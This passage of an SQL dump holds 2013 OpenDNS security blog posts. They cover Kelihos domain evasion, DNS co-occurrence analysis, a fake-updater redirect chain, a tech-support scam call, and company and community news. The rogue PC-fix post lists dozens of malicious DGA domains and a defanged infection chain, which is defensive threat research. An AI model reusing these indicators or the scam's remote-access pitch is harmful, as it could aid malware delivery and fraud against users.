Turkey.\nMulti-layer evasion:\nTo summarize, we observe that the attackers use randomness at several levels to evade detection and blacklisting:\n1. The redirection URL changes between consecutive visits to the same compromised page.\n2. The domain names (2LD) are randomly generated, as are the subdomain names (3LD).\n3. The domains resolve to a single IP with a TTL=0, this in itself tries to simulate a random DNS resolution. We monitor the total number of unique IPs, and can confirm this number is continuously growing.\n4. The “Kelihos” domains are wildcard domains. If you try to resolve a hostname formed by prepending a random string to the domain name, you will get a successful resolution. This seems like an artifact that serves the random generation of subdomains. We presume that the automated script installed on an infected server uses this artifact to generate new random Exploit landing urls, (i.e. the targets of the iframe injection blocks) or payload downloading URLs.', 'Security Graph;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2013/07/30/tracking-versatile-kelihos-domains/');

We threw down the challenge, and the OpenDNS Community answered in a big way, flooding our inbox with amazing entries from every corner of the globe. Although selecting the winners was a long and arduous process, we dug in and came up with six awe-inspiring tales of SysAdmin heroics – and one funny cat photo.\nWithout further ado, presenting the winners of the 2013 OpenDNS SysAdmin Awards:\nSysAdmin of the Year 2013: Teresa Warpula\nOur 2013 SysAdmin of the Year is second to none when it comes to passion for the job. As the lone IT staffer for Minnesota’s largest school district, Teresa manages a seemingly endless list of devices – and she’s adding more. In addition to iPads, desktops, projectors, phones, and servers, Teresa also helps to keep the schools safe by monitoring approximately 100 security cameras, staff badges, and automatic door locks. As if this wasn’t enough, she’s also upgrading to a fiber connection. Teresa is going above and beyond for the members of her district each and every day – an even more amazing feat when you consider she’s on her own.  For everything she does to keep St. Louis County Schools’ networks up-to-date and problem-free, we’re proud to present Teresa Warpula with the 2013 SysAdmin of the Year Award!\nHand-Me-Down-Hacker Award: Ian Silber\nNot all errors SysAdmins face are man-made. Networks can also be compromised by physical dangers and disasters, such as Hurricane Sandy. Ian and his team, working for an MSP in New York, were faced with the task of redoing a client’s entire infrastructure after 4’ of flooding wiped it out during the storm. This outstanding effort led to all mission critical applications and data running again in just 24 hours, with all employees working at almost 100% capacity! Ian showed a true SysAdmin’s insight and planning in having backups ready to go. Thanks to his quick thinking and action, his client was able to avoid catastrophe.\nFlying Solo Award: Gary Hartwell\nThis year, we had a ton of Flying Solo entries – but Gary stood out among them for his valiant efforts as the lone SysAdmin as well as the only IT support staff member at his company. Walking into a perilously outdated server situation, Gary sprang into action and “relocated, consolidated, virtualized, and expanded services to running more than 18 different VM’s”. He also made himself available to solve problems 24/7, even while on vacation! From running the help desk, to acting as a network engineer, updating security measures, and handling database administration, Gary does it all – and for that, he’s the perfect candidate for our Flying Solo Award!\nPEBCAK Award: Eric Reynolds\nEric delighted us with this tale of user-error – we’ll let him tell it in his own words:\n“We had a colored pencil department full of creative types. They loved their Macs with the color corrected screens and crazy graphics programs that never would run right on a Windows machine.\nNot long after I became the sysadmin, one user developed problems with her monitor. She arrived an hour before I did, and would call and leave a message that her monitor was ‘acting funny’. She said the color would be off, it would blink, and sometimes she complained of smoke. By the time I would get in, there was no problem. Color looked good, no problems, and she was working. After a week of this I decided to come in early to see what might be going on.\nWhen I arrived, she was not there yet. So I sat down in an empty chair and waited for her. We spoke for a few moments when she arrived, and I told her to go about her normal routine. She flipped on her computer and monitor and there weren’t any problems. I waited around for an hour but no problem ever showed itself. So I went back to my office. Before I got back I had a message waiting for me, so I ran back to her workspace and sure enough her monitor was going crazy. I asked what happened and she said it was nothing. I asked her every step she took after I walked away.\n“All I did was water my plant!” she cried.\nI looked and noticed a small potted plant on the shelf above her monitor. Under the shelf there was water damage where it would drip down after she watered it.\nI solved the issue with nothing more than a gentle suggestion to keep all liquids away from all electronics, and by moving her plant somewhere that it wouldn’t drip onto the monitor.”\nNeat Freak Award: Brett Mason\nThey say a photo is worth a thousand words – and Brett gave us an album full! Taken while replacing a data center, you can clearly see the amazing transformation Brett and his team were able to turn out. Their makeover raised performance from 45% to 85% – and it’s easy to see why! For completely transforming this data center with no down time, Brett and his team blew away the competition for the ever-popular Neat Freak Award!\n\nMore photos: http://on.fb.me/14bN7kT\nDoing More with Less Award: Erik Sheldon\nErik astounded us with his amazing tale of triumph over obstacles too numerous to count. After being called upon by management to install a Hyper-V solution despite limited working knowledge of the system and no training, Erik somehow made it work with crazy hours, an unhealthy amount of caffeine, and the ever-helpful Google search. One year later, things are still humming along. Erik has proven himself as a heroic SysAdmin who embodies the traits necessary for this demanding job: flexibility, intelligence, and patience; we can’t think of a better recipient for the Doing More with Less Award!\nCaption Contest Winner: dtsomp\n\nAll of our victorious SysAdmins will receive prize packs loaded with tons of goodies to help them get through the day: caffeine, nerf guns, SysAdmin-approved tools, and of course tons of OpenDNS swag –  although the greatest prize of all might be the bragging rights!\nThanks to everyone who entered this year’s OpenDNS SysAdmin Awards!', 'Announcements;Community', 'https://umbrella.cisco.com/blog/2013/07/26/sysadmin-award-winners-2013/');

And unlike the HTTP protocol, the DNS protocol doesn’t provide any tracking information like refer(r)ers or cookies.\nAn intuition, though, is that temporal proximity can be used to predict how related two domain names might be.\nCleaning the data\nWhile data preparation might not sound like the most exciting step of an algorithm, it actually plays a critical role in this case.\nRemember that we don’t have any reliable way to identify the device that sent a query. All we see is an IP address. But home users are frequently assigned a dynamic IP address.\nIn addition, many devices sitting behind a router can share a single external IP address. In this case, we can see many queries within a short time window, that are totally unrelated to each other.\nWe are also observing client IP addresses sending a lot of queries in a row for a small number of domains, which can introduce bias.\nThe first thing we do to mitigate these cases is remove entries from client IPs that have sent more queries than 99.9% of clients IPs. The assertion here is these client IPs are likely to be used by many devices at the same time. They might also be the target of a DNS amplification attack. Ignoring them improves the performance of our algorithm.\nWe then remove duplicate (client ip, name) tuples, keeping only the most recent entries.\nThis ensures that a pair of names can’t be seen more than once for a given IP, and reduces the number of queries for a single hour from 4 billion down to around 400 million.\nWe also remove queries for invalid domain names, accounting for 2% of the unique (client ip, query) tuples.\nTemporal proximity of related malicious domains\nWe need to validate our intuition that DNS queries for related domains might be frequently observed in a small time window.\nLet (M) be the set of domain names that we already flagged as malicious, and (t_i(c)) the timestamp of the first query sent by a client (c) for the domain (i).\nFor each client, we find all the unique pairs of domains ((i,j)) so that (i,j in M^2) and (i < j). We then compute the time difference (left| t_i(c)-t_j(c) right|) which can’t be zero due to the architecture of our DNS resolvers.\nThe histogram of (left| t_i(c)-t_j(c) right|) for all clients and all pairs of malicious domains appears to be gamma distributed, with a shape of 0.56 and a scale of 134.65, for timestamps expressed in seconds.\n\nThe probability for two malicious domains looked up by a client (c) to be related can thus be expressed as [f_c(i,j) = frac{0.04 e^{-0.007 left| t_c(i)-t_c(j)right| }}{left| t_c(i)-t_c(j)right| {}^{0.436}} ]\nThe co-occurrence score\nLet (D_c) be the set of domain names looked up by a client (c).\nIn order to compute a global co-occurrence score, we define (g(i,j)) as the summation of (f_c(i,j)) for every client (c) having sent queries both for (i) and for (j). If no clients have sent a query for both (i) and (j), (g(i,j) = 0).\nFor any given malicious domain, we could use this function to find other domains sharing the same web pages, the same infection chain, or serving the needs of the same malware sample.\nUnfortunately, this doesn’t work very well in practice.\nIt’s not uncommon for malicious web sites to load resources from third-parties, like banners and social network widgets.Furthermore, users that are infected or in the process of being infected keep reading their email, and browsing common web services.\nFor example, queries for google-analytics.com, yieldmanager.com, scorecardresearch.com, msftncsi.com and apple.com are frequently seen around the same time as queries for unrelated domains, including malicious ones.\nAnd the high co-occurrence score of these domains paired with others doesn’t help us discover new domains names that we should take a closer look at.\nWe thus refine the function to lower the score for ((i,j)) if (j) happens to be a domain requested by a lot of client IPs.\nLet (D) be the set of all domain names observed.\n[ s(i,j) = frac{g(i,j)}{sum _{kin D} g(k,j)} ]\nThe actual score we use is normalized:\n[ s\'(i,j) = frac{g(i,j)}{left(sum _{kin D} g(k,j)right) sum _{kin D} s(i,k)} ]\nTwo case studies\nA few months ago, suspicious queries for www1.hsbc.ca caught our attention.\nThis name didn’t resolve, never did, and we suddently saw a spike of traffic for it.\nLike many .ca domain names, hsbc.ca usually gets traffic coming from clients in Canada, US and Great Britain, but what we observed for www1.hsbc.ca was also unusual:\n\nThe highest co-occurrence scores for domains paired with www.hsbc.ca were:\n\nA new DGA pattern was clearly emerging here.\nDiving into the co-occurrences for these DGA domains unveiled many more domains following the same pattern.\nThese domains happened to be C&C domains for the W32.Xpiro.D malware.\nMore recently, a slew of weight loss spam hit our mailboxes. Given only one domain name, we were able to figure out more, even if they happen to be hosted on different IPs:\n\nBy looking further at the co-occurrences, we also found the SEO/Social Media Marketing company which is very likely to be responsible for this campain.\n\nMore use for the co-occurrence score\nThe co-occurrence score has proven to be very useful in order to discover new domain names from domain names that we already know to be malicious.\nBut it is also the foundation for another algorithm that can lead to new malicious domains without having to explicitly provide a starting point. This algorithm will be described in detail in a forthcoming blog post.', 'Big Data;Security Graph;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2013/07/24/co-occurrences/');

If you’ve been following along on social media, you know we do it in a big way. But what IS a System Administrator? Calling someone a “Network Ninja” doesn’t really answer the question, and google usually spits out a series of technical jargon that takes hours to wade through. As is so often the case, we went to the experts for answers – SysAdmin bloggers from around the net who’ve seen it all:\nPhilip Sellers, Tech Talk\nMatt Simmons, Standalone SysAdmin\nTom Limoncelli, Everything SysAdmin\nWe asked each of them a few questions about what it means to be a SysAdmin, as well as the ins and outs of the position. Read their answers below – and remember to thank your SysAdmin this Friday! (Gift suggestions at the bottom!)\n1.) What does being a SysAdmin mean to you?\nTL: Being a SysAdmin means keeping the world running. As “software eats the world”, we’re the people that keep that software going.\nMS: Our world is full of complexity. The world of IT, doubly so. Being a system administrator means taking that complexity and harnessing it and turning disparate pieces of unrelated technology into a useful, coordinated infrastructure. It means making something emerge where there used to be nothing.\nPS: To me, it’s kind of like being a puppet master – we’re behind the scenes pulling the strings to make things work but people rarely get to see us.\n2.) What is the best/worst thing about being a SysAdmin?\nPS: The best and worst thing about being a SysAdmin is that the technology is constantly changing. It means we never stay still and our landscape is constantly moving. We’re always chasing a moving target. We have to adapt and change – it’s both exciting and exhausting, but I think most SysAdmins wouldn’t have it any other way.\nMS: The best thing about being a SysAdmin is being a person or a part of a team that makes a very real difference to the benefit of the organization. There is probably no other position in the company with the kind of responsibility and ability to affect change – both good and bad – with such immediacy. It’s a position of responsibility, and doing it right is a reward unto itself.\nThe worst thing about being a SysAdmin is that nearly none of what I previously mentioned is widely recognized outside of our profession. We are often seen as maintenance workers when, in fact, we manage the entire lifecycle of business critical processes. To succeed in this profession and not get burned out, you need to maintain a healthy dose of internal motivation. If you wait around for praise, you’ll die on the vine. Let the successful job be its own reward.\n3.) What made you become a SysAdmin?\nPS: For me, it’s really a lot of things that came together. I enjoy solving problems. I became obsessed with computers as a teen and got my first taste of systems administration during high school helping to diagnose and fix problems on the school’s Token Ring network. I continue to enjoy getting hands-on with new technology. My dad taught me how to troubleshoot while growing up on the farm and I think that skill, more than anything else, is why I ended up as a SysAdmin instead of another IT career.\nMS: Like most SysAdmins, I kind of fell into it. I worked technical support for an ISP and I was the most advanced Linux user in the (small) company, and I would help the admins out when they ran into problems from time to time. Eventually there was an opening in the team and I was made the “Junior Network Administrator”.\nI worry sometimes that the path that allowed me in won’t stay open for much longer. When I first got into system administration, the “state of the art” was considerably less sophisticated than it is now. I snuck in because I ran the same operating system on my laptop as we did on our servers – Slackware Linux. Now, you need to be more than a command line jockey to be a good admin. You need to know configuration management, programming, as well as most of the things you used to need to know. The increasing layers of abstraction in play adds to the list of things we need to know even as it removes the boring work we used to spend time on.\nTL: I became a sysadmin because I always loved learning the deep internals of any computer system I owned. A side-effect was that I could debug problems better than most people. However, what kept me being a system administrator is my love of operations and figuring out how to improve operations: either by automation or improving processes. I love automating real-world system administration tasks. I REALLY love finding that a process is broken due to a people or process problem, getting all the stakeholders together to discuss it, and getting consensus on how to fix the problem in the future. The big wins are when people get out of their silos and talk with each other.\n4.) Why don’t people appreciate SysAdmins like they should?\nPS: Few people really know what a SysAdmin does day to day. Most of what we do as SysAdmins is hidden from their view. People don’t see the work we do to architect and design systems that minimize problems. People don’t see the complexity that we deal with on a daily basis – complexity that seems to grow constantly. People don’t see the hours we devote to working through problems step by step until we find the root cause and fix it.\nMS: The most commonly stated reason is that we are the “plumbers of the business”, and people only think about us when something breaks. I think that’s a pretty cynical outlook, but not entirely wrong. The bigger issue is that we, as IT professionals, are the “odd bird out” in business. We speak a different language, we use tools that no one else in the business does, and we’re generally thought of as a necessary evil because of this.\nThe onus is on us to change this. We all need to learn to speak “business” better than we do. We have a lot to offer; more than the business knows – even more than we ourselves know. The number of services we can offer the business to help them run better are barely being tapped. Getting better at what we do doesn’t just mean being more technically proficient. It means doing more with what we’ve already got, and by working with business leaders to accomplish organizational goals, we can make sure that in the future, we’ll be recognized and valued more than we ever have been in our history.\nTL: Most people don’t know sysadmins exist. If they do, they confuse system administration with technical support. While many sysadmins spend a lot of their time doing technical support, that’s only because their organization has not grown to be large enough to have dedicated technical support people. In the future, system administrators will spend zero time doing front-line technical support. Devices will self-manage (at least to the point where problems with them are of a tech support nature) and system administrators will be operating services and the infrastructure that supports those services.\n5.) What gift would you like for SysAdmin Appreciation Day?\nPS: I’d like some home lab equipment or an AMEX gift card with no limit.\nMS: Personally, I’m a big fan of space stuff. I’ve currently got a geek crush on Virgin Galactic and SpaceX as companies. If I didn’t already own it, I think a great present would be a copy of Kerbal Space Program (a really fun space program simulator).\nSysAdmins are all different, so you should really talk to your admin before going out and getting a present. Check out the stuff on their desks if you want to do it low key, but that being said, I’ve never seen anyone turn down a gift card to ThinkGeek.\nTL: The best gift I could get is time. There is nothing more valuable. That’s why I wrote a book on time management for system administrators. Yes, it may help them get more done at work, but my hope is that it will help them find ways to get enough done at the office that they can re-claim the 40-hour work week and spend more time at home with family (or family or choice) and friends. Therefore the perfect gift for me would be a day off!', 'Community', 'https://umbrella.cisco.com/blog/2013/07/24/what-is-a-sysadmin/');

In addition to learning product details, understanding priorities, and figuring out new systems and processes, there’s all those names to remember! Since OpenDNS has been hiring like crazy for as long as we can remember, we’ve been working hard to make the employee on-boarding process easier. This program is much bigger than simply signing papers and attending product training. Our goal is to enable our new team members to quickly make a big impact. To celebrate our biggest single-day new hire class ever, we’re sharing the top 9 questions we want OpenDNS employees to be able to answer after their first week:\n\n1.)  Why is our work important?\nLong before an employee actually starts work at OpenDNS, we begin the conversation around the OpenDNS mission. That’s because we want to hire people who are passionate about the idea of disrupting a broken security model to provide a safer Internet. This way, from a new employee’s very first day, we can make sure that every discussion will prove that we don’t just talk the talk – every OpenDNS employee is striving towards the same goal: enabling the world to connect with confidence, anywhere, anytime.\n2.)  So what does OpenDNS do?\nOpenDNS is an innovation leader in the security space – and much of this success is due to the encyclopedic knowledge and vast experience of our team. Leveraging this incredible resource, we provide new hires with a thorough grounding in our product offerings, from every Umbrella product to the game-changing Umbrella Security Graph. This empowers every employee to become a walking, talking knowledge base that customers can rely on for quick and concise answers to even the toughest problems.\n3.)  Who’s in charge here?\nOpenDNS has always valued transparency regarding our service, but this principle extends to our executive team as well. From CEO David Ulevitch down, our company leaders share office space with the rest of the staff – there’s no need for an open door policy because there aren’t any doors. Even as we continue to grow, we maintain a relatively flat org structure that ensures the best ideas win. Period.\n4.)  What’s for lunch?\nOne thing new employees learn quickly is that we take food almost as seriously as our work here. One of the best traits an OpenDNS employee can possess is a collaborative spirit, and lunch is a great time to interact with people from every department – trading theories or relating interesting news. Great ideas can grow from the unlikeliest of places – why not the kitchen table? It’s easy to get distracted by the actual food, however: meals at OpenDNS can range from deliciously crispy empanadas to super spicy samosas – and don’t worry if you’re vegan, gluten-free, etc: meals are equal opportunity, no matter what your preferences are.\n5.)  How are you moving the needle?\nWe know a thing or two about Big Data at OpenDNS. That said, we want to be sure every employee has the data they need to contribute successfully, whether that’s a list of quarterly goals or consistent performance metrics. We also keep live dashboard monitors around the office to remind ourselves of how we’re doing – walking the walk means being able to back up claims with good reporting. This transparency extends to our DNS service as well – our uptime stats page is a constant reminder of how the system is performing (and we’re doing fairly well – 100% uptime since 2006!).\n6.)  What’s different about working at OpenDNS?\nAt OpenDNS, we take the hiring process seriously – and we’re rewarded with extraordinarily smart, incredibly inspired employees, such as our world-class engineering team. People who are okay with the idea of failing early and often – as long as the final product exceeds our customers needs. People who believe in our vision of creating a better internet by making it faster and safer than ever before.\nThese people begin their journey with OpenDNS knowing that they can contribute from Day 1; the flat organizational structure ensures that good ideas are heard – not just by your team, but by our executives – and implemented quickly. This flexibility allows us to constantly innovate and grow the way the industry does, placing OpenDNS at the head of the pack.\n7.)  What am I going to be doing?\nWe know we’ve got enthusiastic talent that’s raring to go – and we’re not holding them back. From coding on your first day, to getting hands-on with sales, to producing marketing content, you’ll be contributing to the bottom line by the time Wednesday rolls around. This accelerated process brings new hires up to speed quickly while gaining the experience they need to continue OpenDNS’s history of excellence, whether in innovation, support, or community.\n8.)  What’s going on around the office?\nWhile we definitely work hard at OpenDNS, there’s always room to have a little fun! Employees enjoy Friday Demos from the engineering team, board game nights, code-a-thons, and (judicious) use of the beer fridges. Letting loose brings the company closer together, and answers the all-important question: who is the supreme ping-pong master? (Pro tip: follow our OpenDNS Facebook page to keep up with all the activities happening around the office!) For new employees, taking advantage of these frequent activities is a fantastic way to get to know your fellow members of Team OpenDNS, and expand your personal brand within the company.\n\n9.)  What’s the team dynamic like?\nWe don’t call our employees Team OpenDNS without good reason. From their first day onwards, everyone contributes, utilizing their own special talents to move the needle. Our collaborative spirit and dedication to innovation grow from every employee’s desire to make our vision of the Internet a reality.\nWe don’t see problems, red tape, or impossibilities – we see opportunities, motivators, and calls to action. We’re the dynamic and agile disruptors, here to make the internet better, faster, and safer for all.  We support each other, constantly crossing department lines to ensure that every product and piece of content is better than the one that came before.\nWe’re the good guys. We come in early, we stay late. We support a global network of 50 million users, processing 50 billion DNS requests daily through 19 datacenters with ZERO downtime, and we’re growing at an exponential rate, doing more business and hiring more people than ever before. We’re Team OpenDNS, and we’re changing the way the world views cloud-delivered security – one network at a time.\nIf this sounds awesome (and it should), be sure to check out our careers page for more information!', 'Umbrella', 'https://umbrella.cisco.com/blog/2013/07/09/9-things-new-employees-learn-in-the-first-week-at-opendns/');
INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1646, 'Massive Algorithmic Discovery and Beyond', 'OpenDNS Security Research', 'July 8, 2013', 'Today’s blog is a fun story of how Umbrella Security Lab researchers uncovered a massive rogue PC fix campaign, relying on both algorithmic big data crunching models, sandboxing and field investigations (including an anonymous phone call to the rogue PC fix service under a customer name of  Virgilio Calabrese).\nThe storyline\nAs Umbrella Security Lab often demos, patterns emerge when you possess the right data and weave them altogether. This can be done despite attackers’ efforts to randomize traffic, injecting noises to hide their traces with all kinds of creative tricks. Since last week, we start spotting a large number of domains that were picked up by one of our analytical models – CRANK. These domains all showed very similar low crank scores. The crank model relies on DNS requesting behavior, and a crank score derives from co-occurrence patterns among domains. The biggest pattern indicator is when two domains co-occur, meaning that a statistically significant number of clients have requested both domains consecutively within a small time frame. If a domain co-occurred with one or more known malicious domain in the examined time frame, it will receive a lower crank score than the ones that never co-occurred with known malicious domains.\nFor this report, the examined set of domain names appeared to be DGA (domain generating algorithm) names. At the time of discovery (a week ago from this report), the Umbrella Security team found nothing about the legitimacy of these domains online. This indicated that something is definitely not right, and we therefore started to find out the domains’ true nature.\nAt first sight, the domains seem to be parked pages, but if we access them using specific user agents and without initial cookies, we are dragged into a redirection chain that leads to the attempted dropping of a variety of suspicious executables (in one visit it was a fake Chrome updater)\n\nAfter the first visit, this is what the parking page looks like:\n\nHere is one of the redirections chain we observed:\n– hxxp://sozvigupvuxs.com – The landing page, loading a frame on the same domain. This frame returns either a redirection to hxxp://OTNNetwork.net, or, if a specific cookie is found, the parking page.\n– hxxp://OTTNetwork.net then serves some javascript redirecting to hxxp://98795.acrosslookup.com\n– hxxp://98795.accesslookup.com is abused for click fraud, redirecting to hxxp://ck.ads.affinity.com\n– hxxp://ck.ads.affinity.com redirects to the target of the fake click, hxxp://o800.info\n– hxxp://0800.info shows a fake site with some basic javascript code performing browser detection in order to display a relevant “your browser is outdated” page, and then redirects to hxxp://secure.oi-installer9.com\n– hxxp://secure.oi-installer9.com serves Windows executable file with different names (e.g. Internet_Explorer_Setup.exe) according to the client browser.\n\nRight after having downloaded and installed the “updated Chrome version”, a popup asked us to “scan and fix  Windows XP errors”.\n\n\nThe number of DNS queries we are seeing for the domain name serving this file is fairly high. We blocked it in order to protect our customers.\n\nLaunching the product was the beginning of the end.\nA fake antivirus (“PC Health Boost”) found 96 errors, and 37 more that required a paid version in order to be fixed. Other popups told us to download and install yet another fake antivirus (a fake version of F-Prot). And yet another one (“Malware Striker”, similar to the first one, just with a different skin). Then, a fake video player (“FLV Mplayer”) and so on an so forth.\nNot to mention that Chrome had new extensions and toolbars, and a new default search engine.\n\n\nRestarting the browser showed that it was spawning a background process on startup, presumably a keylogger or a banking trojan.\n\nThe phone call\nAfter the installation of the executable, several pop-ups offering 24×7 PC help would appear on the screen. We called an 800 number that showed up on one of the pop-ups and pretended to be a not too savvy PC user named Virgilio Calabrese, who needed help because his laptop was slow and was showing a lot of annoying pop-ups.\nWe got a male voice on the other end of the line–let’s call him “Tom”–who claimed to be from Microsoft. During the conversation, Tom tried to have us check a few things to figure out the problem, but we told him, we really didn’t know what was going on, so Tom then asked us to go to support.me which then leads to https://secure.logmeinrescue.com/Customer/Code.aspx.\n\nLogMeIn Rescue is in fact a legit product used by IT helpdesks and call centers to provide instant remote support to customers and employees. Tom then provided a code needed to enter the logmeinrescue session, which granted him remote access to our laptop.\nWe had a Windows XP VM running on our lab laptop, and after Tom gained access to the VM, we witnessed him running a few checks remotely on our laptop. We pretended to be worried and told Tom we were not comfortable with him manipulating our machine remotely. At this, he reassured us that he was from Microsoft, and that he was not the problem, but our PC saving grace. He insisted he was here trying to help and that we should trust him. At this point, we hung up.\nTom persistently called back. After a few more interactions, we decided to end the call for good and cut the connection.\nA look into the traffic of these domains\nHere are some of the domains we discovered:\nsozvigupvuxs.com\nmahakixiq.com\nkugmoqwozdat.com\nheivoveobi.com\ngoqwodilde.com\ndugicqokila.com\nxuhojihux.com\ntugheawixe.com\nsozvigupvuxs.com\nratvuxmozf.com\npozgafmanmoz.com\nmahakixiq.com\nkugmoqwozdat.com\njoztupilma.com\njeopozmuj.com\nhuxbeinafdun.com\nhokbozjeob.com\nheivoveobi.com\ngoqwodilde.com\ndugicqokila.com\ndadosukoqhi.com\nceixafjeo.com\nbiltoqdaffih.com\nbajupvoktos.com\nxugjiweiru.com\njulucicjija.com\ngoqcanwoqb.com\nvealiciluxr.com\nvaraqipeavi.com\nmozdilpanl.com\nheivageamo.com\nfeiluheagear.com\nfanxafdatrir.com\ndeacogeaw.com\ndatsicrucoso.com\ncuvibokmu.com\nxobocodon.com\nkirneodoqu.com\njujigafhoka.com\njixeijeog.com\nhoknafgoca.com\nWe also discovered a couple thousand more domains clustered to two IP netblocks.\n\n\n(The clustering graph shows some outliers that were also picked up by our algorithms but not mapped to the same IP netblocks. They are eliminated from the above analysis.)\nTaking a sample of these domains, we found that they were all registered May 19 or May 26, 2013. Looking at the traffic to these domains, we found that it had been periodic for a couple weeks, then it dropped about five days ago, which suggests some sort of “spam campaign” that used those domains.\nThe campaign would have been meant to lead users to inadvertently visit the domains, go through the redirection chain and get the suspicious executable installed. To check this theory, we collected the client IPs that looked up some of the domains for a day, and we found that a lot of the IPs map to mail servers or DNS resolvers. These mail servers and DNS resolvers are most likely configured to use OpenDNS as they contacted our resolvers to look the suspicious domains up before relaying spam or before human users can visit the sites through their browser.\nOn another note, several of these domains like jixeijeog[.] com were also reported in the network traffic of PushDo trojan samples (look for the domain in the Behavioral information tab of the virustotal report). PushDo is known as a “downloader” trojan, which means its real purpose is to download and install malicious software. These domains are acting as either a rogue software campaign through the browser or as a CnC for already installed PushDo samples attempting to download more malware on the infected host.', 'Security Graph;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2013/07/08/massive-algorithmic-discovery-and-beyond/');
INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1647, '2nd Graphlab Workshop 2013', 'OpenDNS Security Research', 'July 5, 2013', 'A few hundred researchers from academia and industry gathered on Monday, July 1 for the 2nd annual Graphlab Workshop at the Nikko hotel in downtown San Francisco. The event was a great success in acting as a venue to discuss challenges and opportunities the emerging large scale graph analytics community currently faces. The Umbrella Security Labs team was present at the event, and in this blog we share with you our take-aways.\nGraphLab\nThe first talk was about a product we have been excited about for quite some time called GraphLab.\nGraphLab is a new framework for running graph-parallel algorithms, mainly developed at the Carnegie Mellon University over the past six years.\nWhile the MapReduce programming model has proven to be excellent for data-parallel tasks on massive amounts of data, it’s not very suitable for graph algorithms. These algorithms are not easily expressed in the MapReduce model, and require copying a lot of data between iterations. Efforts like Haloop partially solve the later but not the former.\nThe Bulk Synchronous Parallel programming model is clearly a better fit. In this model, individual components (e.g. vertices of a graph) perform computations, possibly update their own state and communicate with other components using message passing. An iteration is complete after all components are done.\nIn the world of graph databases, the bulk synchronous parallel model was popularized in 2010 after Google released the Pregel paper.\nAnd it is surprisingly simple. A single-node implementation of Google Pregel fits in 100 lines of code.\nVertex-centric computations make it easy to “parallelize” any algorithm. And partitioning can also become as simple as randomly assigning vertices to hosts.\nBut the barrier required between two iterations can be a serious bottleneck. In addition, this model requires storing two versions of all values (the previous iteration and the new value).\nGraphLab’s primary motives were to avoid the bottleneck and to achieve exceptional performance on distributed graph processing.\nThe GraphLab core is a high-level C++ library (with Python and Java APIs) providing the following:\n– compact in-memory graph storage. Graphs can be automatically distributed across the cluster.\n– a clean API to let each vertex perform computations and updates.\n– a set of schedulers to distribute tasks across all available CPUs.\n– utilities for loading and saving graphs (locally or through HDFS), random number generators with chosen distributions, and generic utilities for writing portable code.\nGraphLab uses MPI for inter-process communications, and job configuration can be read from Zookeeper.\nThe first version of GraphLab made it easy to express algorithms, but didn’t ensure race-free operations. One had to choose, for each algorithm, between strong consistency (hence no race conditions, but a slower runtime) and weak consistency, ignoring conflicting writes that can be acceptable for some algorithms.\nThe second version of GraphLab introduced a different programming model.\nA “gather” phase retrieves information from other vertices, an “apply” phase updates the current vertex, and a “scatter” phase sends message to other vertices to prepare the next iteration. These three decomposable update functors can run asynchronously, and updates can happen in batch in order to optimize inter-node communications. This accelerates convergence of many numerical algorithms.\nThanks to these changes, this second version of GraphLab, code named “PowerGraph”, can efficiently process natural graphs. The graph of DNS queries we are processing definitely fits in this category, with top domains like google.com being adjacent to over 78% edges.\nUmbrella Security Labs tried GraphLab 2 a couple months ago on our research 10-node cluster, and were impressed by the results. Algorithms running at high speed allowed us to quickly build new models and check their output on a complete data set.\nFurthermore, a solid set of algorithms have already been implemented on top of this incredibly fast engine. They address a wide range of problems, from the domains of graph mining, to machine learning and linear algebra.\nDuring the workshop, the next generation of the GraphLab framework, code named WarpGraph, has been unveiled. For starters, GraphLab is now available on Github, so anybody can seamlessly contribute new code and documentation to the project.\nPowerGraph focused on performance. However, the programming models were slightly more complex than the original one, requiring a lot of contortions to make some algorithms fit.\nWarpGraph focuses on usability by providing a simple way to write vertex-centric programs. Programs can now be written as coroutines implementing mini map/reduce operations. Performance is comparable to–and, in some cases better than–GraphLab 2.\nA live demo of GraphLab accessed through an iPython notebook for interactive data analysis brillantly concluded the first presentation of the day.\nGraphChi\nGraphLab keeps the full graph and all values in (distributed) memory, which is why performance improvements have been mainly achieved by increasing paralellism and reducing communications.\nGraphChi, another project maintained by the same team as GraphLab, addresses a different problem: single-machine computations on large graphs that don’t fit in memory. The only option to do so is obviously to store and update the graph on disk.\nGraphChi’s API is very similar to GraphLab’s, and most algorithms can already run on both, or can be adapted with minimum effort.\nAt first, on-disk operations sound like a terrible idea for running graph algorithms, as even a SSD is order of magnitudes slower than main memory, especially for random access.\nBut GraphChi introduces an technique that actually makes on-disk graph processing extremely fast.\nA reasonable assumption is that the update function will only need to read/write values from/to neighbor vertices.\nIn GraphChi, the adjacency set is split across shards, each with approximatively the same total number of edges, and so that the largest shard can fully fit in memory (actually 1/4 of the available memory, in order to keep room for other runtime data).\nWithin each shard, in-edges and out-edges are stored separately as a {source vertex, {list of edges}} array, in order to keep the number of disk seeks to a minimum when updating a vertex.\nThis array is indexed, and sorted by the source vertex. That way, accessing the edges of vertices within an interval for a given shard only requires sequential disk access, and the window can be much smaller than the full shard.\nAfter preprocessing the graph in order to build the shards, GraphChi loads a full shard in memory. The update operation will be applied to this specific subgraph before commiting changes made to this shard to disk and moving over to the next shard.\nSome neighbors required for the update operations will already be part of the in-memory shard and can be directly updated. Others are in different shards. For each of these on-disk shards, the relevant window (remember, the array is sorted by source vertex) is loaded and possibly updated.\nAn iteration is complete once all shards have been sequentially loaded in memory.\nThe beauty of this technique is that most I/O operations are sequential, and that it efficiently uses the main memory to limit the amount of operations. Unlike GraphLab, there is no interprocess communication involved: updates are directly made in memory before being flushed in batch to disk.\nThe GraphChi implementation also allows online updates, storing new edges in a temporary in-memory buffer that can eventually be materialized into actual shards.\nNot only large graphs can be processed on commodity hardware, but benchmarks are impressive. A laptop running GraphChi frequently achieves results comparable to a 8 nodes cluster, provided that the graph has already been converted to a set of shards.\nLast, but not least, a Java implementation of GraphChi is available. While slower than the C++ version, it can be used as a Pig UDF.\nPig is already our long-time best friend. Don’t tell him, but there’s a high probably that our lab will also give labradors and chihuahuas a lot of love in the months to come.\n\n\nGraph Processing at Facebook Scale\nAnother talk we liked is from Dr. Avery Ching, a contributor to Giraph, now working at Facebook. Guess what his talk is about.:)\nWe personally haven’t tried Giraph. As demoed in Dr. Avery’s talk, it works quite well with Facebook-scale data. It was certainly inspiring to get some of the ideas behind Giraph such 